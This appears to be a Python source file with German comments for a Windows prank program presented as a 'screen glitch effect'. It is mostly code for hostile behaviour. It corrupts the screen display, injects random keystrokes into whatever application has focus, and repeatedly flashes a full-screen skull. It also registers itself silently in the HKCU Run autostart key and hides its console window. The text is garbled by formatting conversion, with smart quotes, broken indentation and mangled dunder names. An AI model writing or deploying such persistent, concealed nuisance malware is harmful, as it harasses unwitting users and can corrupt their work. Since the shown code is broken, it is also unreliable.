“””
Screen Glitch Effect for Windows
Erzeugt einen periodischen Glitch-Effekt mit Zittern und chromatischer Aberration
Tippt zufällig Buchstaben
“””

import time
import random
import sys
import os
import winreg
import ctypes
import string
from ctypes import wintypes

class ScreenGlitcher:
def **init**(self):
self.running = True
self.user32 = ctypes.windll.user32
# Timer für Totenkopf-Effekt (alle 5 Minuten = 300 Sekunden)
self.last_skull_time = time.time()
self.skull_interval = 300  # 5 Minuten in Sekunden

```
def show_skull(self):
    """Zeigt einen Totenkopf an, der rot neon aufleuchtet und verblasst"""
    try:
        import tkinter as tk
        import threading
        import math
        
        def draw_skull(canvas, x, y, size, color):
            """Zeichnet einen detaillierten low-poly Totenkopf mit Knochen"""
            
            # === SCHÄDEL ===
            # Oberer Schädel (gerundetes Rechteck aus Dreiecken)
            skull_top = y - size * 0.8
            skull_bottom = y + size * 0.2
            skull_left = x - size * 0.65
            skull_right = x + size * 0.65
            
            # Schädeldecke (mehrere Dreiecke für gerundete Form)
            dome_points = []
            num_segments = 12
            for i in range(num_segments + 1):
                angle = math.pi * (i / num_segments)
                px = x + math.cos(angle) * size * 0.65
                py = skull_top + (1 - math.sin(angle)) * size * 0.3
                dome_points.append((px, py))
            
            # Zeichne Schädeldecke
            for i in range(len(dome_points) - 1):
                canvas.create_polygon(
                    x, skull_top,
                    dome_points[i][0], dome_points[i][1],
                    dome_points[i+1][0], dome_points[i+1][1],
                    fill=color, outline='black', width=2
                )
            
            # Seitenwände des Schädels
            canvas.create_polygon(
                skull_left, skull_top + size * 0.3,
                skull_left, skull_bottom,
                skull_left + size * 0.15, skull_bottom + size * 0.05,
                skull_left + size * 0.1, skull_top + size * 0.35,
                fill=color, outline='black', width=2
            )
            
            canvas.create_polygon(
                skull_right, skull_top + size * 0.3,
                skull_right, skull_bottom,
                skull_right - size * 0.15, skull_bottom + size * 0.05,
                skull_right - size * 0.1, skull_top + size * 0.35,
                fill=color, outline='black', width=2
            )
            
            # Stirn (flache Dreiecke)
            canvas.create_polygon(
                skull_left + size * 0.1, skull_top + size * 0.35,
                x, skull_top + size * 0.25,
                skull_left + size * 0.3, skull_top + size * 0.4,
                fill=color, outline='black', width=2
            )
            
            canvas.create_polygon(
                skull_right - size * 0.1, skull_top + size * 0.35,
                x, skull_top + size * 0.25,
                skull_right - size * 0.3, skull_top + size * 0.4,
                fill=color, outline='black', width=2
            )
            
            # === AUGENHÖHLEN (dreieckig, low-poly) ===
            eye_y = y - size * 0.35
            eye_size = size * 0.22
            eye_offset = size * 0.35
            
            # Linkes Auge (Dreieck nach unten)
            canvas.create_polygon(
                x - eye_offset, eye_y - eye_size * 0.8,
                x - eye_offset - eye_size, eye_y + eye_size * 0.5,
                x - eye_offset + eye_size, eye_y + eye_size * 0.5,
                fill='black', outline='black', width=2
            )
            
            # Rechtes Auge (Dreieck nach unten)
            canvas.create_polygon(
                x + eye_offset, eye_y - eye_size * 0.8,
                x + eye_offset - eye_size, eye_y + eye_size * 0.5,
                x + eye_offset + eye_size, eye_y + eye_size * 0.5,
                fill='black', outline='black', width=2
            )
            
            # === NASE (umgedrehtes Herz aus Dreiecken) ===
            nose_y = y - size * 0.05
            nose_size = size * 0.15
            
            canvas.create_polygon(
                x, nose_y + nose_size,
                x - nose_size * 0.6, nose_y - nose_size * 0.3,
                x, nose_y - nose_size * 0.5,
                fill='black', outline='black', width=2
            )
            
            canvas.create_polygon(
                x, nose_y + nose_size,
                x + nose_size * 0.6, nose_y - nose_size * 0.3,
                x, nose_y - nose_size * 0.5,
                fill='black', outline='black', width=2
            )
            
            # === OBERKIEFER ===
            jaw_top = y + size * 0.15
            
            # Wangenknochen (Dreiecke)
            canvas.create_polygon(
                skull_left + size * 0.15, skull_bottom,
                x - size * 0.5, jaw_top,
                x - size * 0.3, jaw_top + size * 0.1,
                fill=color, outline='black', width=2
            )
            
            canvas.create_polygon(
                skull_right - size * 0.15, skull_bottom,
                x + size * 0.5, jaw_top,
                x + size * 0.3, jaw_top + size * 0.1,
                fill=color, outline='black', width=2
            )
            
            # === UNTERKIEFER ===
            jaw_bottom = y + size * 0.6
            jaw_width = size * 0.55
            
            # Unterkiefer-Form (polygon aus mehreren Punkten)
            canvas.create_polygon(
                x - jaw_width, jaw_top + size * 0.15,
                x - jaw_width * 0.7, jaw_bottom - size * 0.05,
                x - jaw_width * 0.3, jaw_bottom,
                x, jaw_bottom - size * 0.02,
                x + jaw_width * 0.3, jaw_bottom,
                x + jaw_width * 0.7, jaw_bottom - size * 0.05,
                x + jaw_width, jaw_top + size * 0.15,
                fill=color, outline='black', width=2
            )
            
            # === ZÄHNE (Dreiecke) ===
            teeth_count = 8
            teeth_spacing = (jaw_width * 2) / teeth_count
            teeth_y = jaw_top + size * 0.2
            teeth_height = size * 0.12
            
            for i in range(teeth_count):
                tooth_x = x - jaw_width + (i + 0.5) * teeth_spacing
                canvas.create_polygon(
                    tooth_x - size * 0.05, teeth_y,
                    tooth_x + size * 0.05, teeth_y,
                    tooth_x, teeth_y + teeth_height,
                    fill='black', outline='black', width=1
                )
            
            # === GEKREUZTE KNOCHEN UNTER DEM SCHÄDEL ===
            bone_y = jaw_bottom + size * 0.3
            bone_length = size * 0.8
            bone_width = size * 0.12
            
            # Linker Knochen (von links-unten nach rechts-oben)
            # Knochenende links
            canvas.create_polygon(
                x - bone_length * 0.5, bone_y + bone_length * 0.3,
                x - bone_length * 0.5 - bone_width * 0.6, bone_y + bone_length * 0.3 - bone_width * 0.3,
                x - bone_length * 0.5 - bone_width * 0.6, bone_y + bone_length * 0.3 + bone_width * 0.3,
                fill=color, outline='black', width=2
            )
            
            canvas.create_polygon(
                x - bone_length * 0.5, bone_y + bone_length * 0.3,
                x - bone_length * 0.5 + bone_width * 0.3, bone_y + bone_length * 0.3 - bone_width * 0.6,
                x - bone_length * 0.5 + bone_width * 0.3, bone_y + bone_length * 0.3 + bone_width * 0.6,
                fill=color, outline='black', width=2
            )
            
            # Schaft links
            canvas.create_polygon(
                x - bone_length * 0.5 + bone_width * 0.3, bone_y + bone_length * 0.3 - bone_width * 0.3,
                x + bone_length * 0.5 - bone_width * 0.3, bone_y - bone_length * 0.3 - bone_width * 0.3,
                x + bone_length * 0.5 - bone_width * 0.3, bone_y - bone_length * 0.3 + bone_width * 0.3,
                x - bone_length * 0.5 + bone_width * 0.3, bone_y + bone_length * 0.3 + bone_width * 0.3,
                fill=color, outline='black', width=2
            )
            
            # Knochenende rechts-oben
            canvas.create_polygon(
                x + bone_length * 0.5, bone_y - bone_length * 0.3,
                x + bone_length * 0.5 + bone_width * 0.6, bone_y - bone_length * 0.3 - bone_width * 0.3,
                x + bone_length * 0.5 + bone_width * 0.6, bone_y - bone_length * 0.3 + bone_width * 0.3,
                fill=color, outline='black', width=2
            )
            
            canvas.create_polygon(
                x + bone_length * 0.5, bone_y - bone_length * 0.3,
                x + bone_length * 0.5 - bone_width * 0.3, bone_y - bone_length * 0.3 - bone_width * 0.6,
                x + bone_length * 0.5 - bone_width * 0.3, bone_y - bone_length * 0.3 + bone_width * 0.6,
                fill=color, outline='black', width=2
            )
            
            # Rechter Knochen (von rechts-unten nach links-oben)
            # Knochenende rechts
            canvas.create_polygon(
                x + bone_length * 0.5, bone_y + bone_length * 0.3,
                x + bone_length * 0.5 + bone_width * 0.6, bone_y + bone_length * 0.3 - bone_width * 0.3,
                x + bone_length * 0.5 + bone_width * 0.6, bone_y + bone_length * 0.3 + bone_width * 0.3,
                fill=color, outline='black', width=2
            )
            
            canvas.create_polygon(
                x + bone_length * 0.5, bone_y + bone_length * 0.3,
                x + bone_length * 0.5 - bone_width * 0.3, bone_y + bone_length * 0.3 - bone_width * 0.6,
                x + bone_length * 0.5 - bone_width * 0.3, bone_y + bone_length * 0.3 + bone_width * 0.6,
                fill=color, outline='black', width=2
            )
            
            # Schaft rechts
            canvas.create_polygon(
                x + bone_length * 0.5 - bone_width * 0.3, bone_y + bone_length * 0.3 - bone_width * 0.3,
                x - bone_length * 0.5 + bone_width * 0.3, bone_y - bone_length * 0.3 - bone_width * 0.3,
                x - bone_length * 0.5 + bone_width * 0.3, bone_y - bone_length * 0.3 + bone_width * 0.3,
                x + bone_length * 0.5 - bone_width * 0.3, bone_y + bone_length * 0.3 + bone_width * 0.3,
                fill=color, outline='black', width=2
            )
            
            # Knochenende links-oben
            canvas.create_polygon(
                x - bone_length * 0.5, bone_y - bone_length * 0.3,
                x - bone_length * 0.5 - bone_width * 0.6, bone_y - bone_length * 0.3 - bone_width * 0.3,
                x - bone_length * 0.5 - bone_width * 0.6, bone_y - bone_length * 0.3 + bone_width * 0.3,
                fill=color, outline='black', width=2
            )
            
            canvas.create_polygon(
                x - bone_length * 0.5, bone_y - bone_length * 0.3,
                x - bone_length * 0.5 + bone_width * 0.3, bone_y - bone_length * 0.3 - bone_width * 0.6,
                x - bone_length * 0.5 + bone_width * 0.3, bone_y - bone_length * 0.3 + bone_width * 0.6,
                fill=color, outline='black', width=2
            )
        
        def fade_skull():
            root = tk.Tk()
            root.attributes('-fullscreen', True)
            root.attributes('-topmost', True)
            root.configure(bg='black')
            
            # Windows-spezifisch: Mache Fenster transparent
            root.wm_attributes('-alpha', 0.0)
            
            # Erstelle Canvas
            canvas = tk.Canvas(root, bg='black', highlightthickness=0)
            canvas.pack(fill='both', expand=True)
            
            # Hole Bildschirmgröße
            screen_width = root.winfo_screenwidth()
            screen_height = root.winfo_screenheight()
            
            skull_x = screen_width // 2
            skull_y = screen_height // 2 - 50
            skull_size = min(screen_width, screen_height) // 5
            
            # Fade In (5 Sekunden, heller werdend)
            steps = 100
            
            def fade_in(step=0):
                if step < steps:
                    alpha = step / steps
                    # Ändere Farbe von dunkelrot zu neonrot
                    red_value = int(128 + (127 * alpha))
                    color = f'#{red_value:02x}0000'
                    
                    # Lösche alten Inhalt
                    canvas.delete('all')
                    
                    # Zeichne Totenkopf
                    draw_skull(canvas, skull_x, skull_y, skull_size, color)
                    
                    root.wm_attributes('-alpha', alpha * 0.9)  # Max 90% opacity
                    root.after(50, lambda: fade_in(step + 1))
                else:
                    # Halte für 3 Sekunden
                    root.after(3000, lambda: fade_out(0))
            
            def fade_out(step=0):
                if step < steps:
                    alpha = 1.0 - (step / steps)
                    # Ändere Farbe von neonrot zu dunkelrot
                    red_value = int(128 + (127 * alpha))
                    color = f'#{red_value:02x}0000'
                    
                    # Lösche alten Inhalt
                    canvas.delete('all')
                    
                    # Zeichne Totenkopf
                    draw_skull(canvas, skull_x, skull_y, skull_size, color)
                    
                    root.wm_attributes('-alpha', alpha * 0.9)
                    root.after(50, lambda: fade_out(step + 1))
                else:
                    root.destroy()
            
            fade_in()
            root.mainloop()
        
        # Starte in separatem Thread
        thread = threading.Thread(target=fade_skull, daemon=True)
        thread.start()
        
    except Exception as e:
        pass

def type_random_characters(self):
    """Tippt zufällige Buchstaben"""
    try:
        # Anzahl der zu tippenden Zeichen (1-5)
        num_chars = random.randint(1, 5)
        
        # Wähle zufällige Zeichen (Buchstaben, Zahlen, einige Sonderzeichen)
        chars = string.ascii_letters + string.digits + " .,!?"
        
        for _ in range(num_chars):
            char = random.choice(chars)
            
            # Konvertiere Zeichen zu Virtual Key Code
            vk_code = self.user32.VkKeyScanW(ord(char))
            
            # Simuliere Tastendruck
            # keybd_event(vk_code, scan_code, flags, extra_info)
            self.user32.keybd_event(vk_code & 0xFF, 0, 0, 0)  # Key Down
            time.sleep(0.05)
            self.user32.keybd_event(vk_code & 0xFF, 0, 2, 0)  # Key Up
            time.sleep(random.uniform(0.05, 0.15))
        
    except Exception:
        pass

def apply_glitch(self, intensity='medium'):
    """
    Wendet einen Glitch-Effekt auf den Bildschirm an
    intensity: 'low', 'medium', 'high'
    """
    try:
        # Offset-Werte für den Glitch-Effekt (in Pixel)
        offsets = {
            'low': (2, 4),
            'medium': (4, 8),
            'high': (6, 12)
        }
        
        x_offset, y_offset = offsets.get(intensity, offsets['medium'])
        
        # Zufällige Richtung
        x = random.choice([-x_offset, 0, x_offset])
        y = random.choice([-y_offset, 0, y_offset])
        
        # Hole Device Context
        hdc = self.user32.GetDC(0)
        if hdc:
            # Hole Bildschirmgröße
            width = self.user32.GetSystemMetrics(0)
            height = self.user32.GetSystemMetrics(1)
            
            # Erstelle Glitch durch Bit-Block-Transfer mit invertierten Farben
            gdi32 = ctypes.windll.gdi32
            
            num_glitches = random.randint(2, 5)
            for _ in range(num_glitches):
                glitch_x = random.randint(0, width - 100)
                glitch_y = random.randint(0, height - 100)
                glitch_w = random.randint(50, 300)
                glitch_h = random.randint(10, 100)
                
                gdi32.BitBlt(
                    hdc, glitch_x + x, glitch_y + y, glitch_w, glitch_h,
                    hdc, glitch_x, glitch_y,
                    0x00550009  # DSTINVERT - invertiert Zielfarben
                )
            
            self.user32.ReleaseDC(0, hdc)
        
        # Chromatische Aberration durch Farbverschiebung simulieren
        self.apply_color_shift()
        
    except Exception as e:
        pass

def apply_color_shift(self):
    """Wendet eine Farbverschiebung an (Pink/Blau Effekt)"""
    try:
        hdc = self.user32.GetDC(0)
        if hdc:
            gdi32 = ctypes.windll.gdi32
            
            # Erstelle farbige Overlay-Effekte
            width = self.user32.GetSystemMetrics(0)
            height = self.user32.GetSystemMetrics(1)
            
            # Zufällige Farbverschiebung (Pink/Cyan)
            colors = [
                0x00FF00FF,  # Magenta/Pink
                0x00FFFF00,  # Cyan
                0x00FF0080,  # Pink-Lila
            ]
            
            color = random.choice(colors)
            
            # Erstelle semi-transparente Streifen
            num_stripes = random.randint(1, 3)
            for _ in range(num_stripes):
                stripe_y = random.randint(0, height - 50)
                stripe_h = random.randint(2, 10)
                
                # Erstelle Brush mit Farbe
                brush = gdi32.CreateSolidBrush(color)
                rect = wintypes.RECT(0, stripe_y, width, stripe_y + stripe_h)
                
                # Zeichne halbtransparenten Streifen
                self.user32.FillRect(hdc, ctypes.byref(rect), brush)
                gdi32.DeleteObject(brush)
            
            self.user32.ReleaseDC(0, hdc)
            
    except Exception:
        pass

def run(self):
    """Hauptschleife des Glitch-Effekts"""
    print("Screen Glitcher gestartet...")
    print("\nProgramm läuft im Hintergrund. Schließe dieses Fenster nicht.")
    
    while self.running:
        try:
            # Prüfe ob Totenkopf angezeigt werden soll (alle 5 Minuten)
            current_time = time.time()
            if current_time - self.last_skull_time >= self.skull_interval:
                print("Zeige Totenkopf...")
                self.show_skull()
                self.last_skull_time = current_time
            
            # Zufällige Pause zwischen Aktionen (2-8 Sekunden)
            wait_time = random.uniform(2.0, 8.0)
            time.sleep(wait_time)
            
            # Entscheide zufällig ob Glitch oder Typing
            action = random.choice(['glitch', 'glitch', 'type'])  # 2/3 Glitch, 1/3 Typing
            
            if action == 'glitch':
                # Wähle zufällige Intensität
                intensity = random.choice(['low', 'medium', 'medium', 'high'])
                
                # Wende Glitch an
                self.apply_glitch(intensity)
                
                # Glitch-Dauer (0.05 - 0.2 Sekunden)
                glitch_duration = random.uniform(0.05, 0.2)
                time.sleep(glitch_duration)
                
                # Refresh Display
                self.user32.InvalidateRect(0, None, True)
                
            elif action == 'type':
                # Tippe zufällige Zeichen
                self.type_random_characters()
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            # Bei Fehler kurz warten und weitermachen
            time.sleep(1)
    
    print("\nScreen Glitcher beendet.")
```

def add_to_autostart():
“”“Fügt das Programm zum Windows-Autostart hinzu”””
try:
exe_path = sys.executable if getattr(sys, ‘frozen’, False) else **file**

```
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE
    )
    
    winreg.SetValueEx(key, "ScreenGlitcher", 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(key)
    
    print("✓ Zum Autostart hinzugefügt")
    return True
    
except Exception as e:
    print(f"✗ Fehler beim Hinzufügen zum Autostart: {e}")
    return False
```

if **name** == ‘**main**’:
# Beim ersten Start Autostart konfigurieren
if getattr(sys, ‘frozen’, False):
try:
# Prüfe ob bereits im Autostart
key = winreg.OpenKey(
winreg.HKEY_CURRENT_USER,
r”Software\Microsoft\Windows\CurrentVersion\Run”,
0,
winreg.KEY_READ
)
try:
winreg.QueryValueEx(key, “ScreenGlitcher”)
already_in_autostart = True
except:
already_in_autostart = False
winreg.CloseKey(key)

```
        if not already_in_autostart:
            print("Erste Installation - Konfiguriere Autostart...")
            add_to_autostart()
            time.sleep(2)
    except:
        pass
    
    # Verstecke Konsolenfenster
    ctypes.windll.user32.ShowWindow(
        ctypes.windll.kernel32.GetConsoleWindow(), 
        0  # SW_HIDE
    )

glitcher = ScreenGlitcher()
glitcher.run()
```
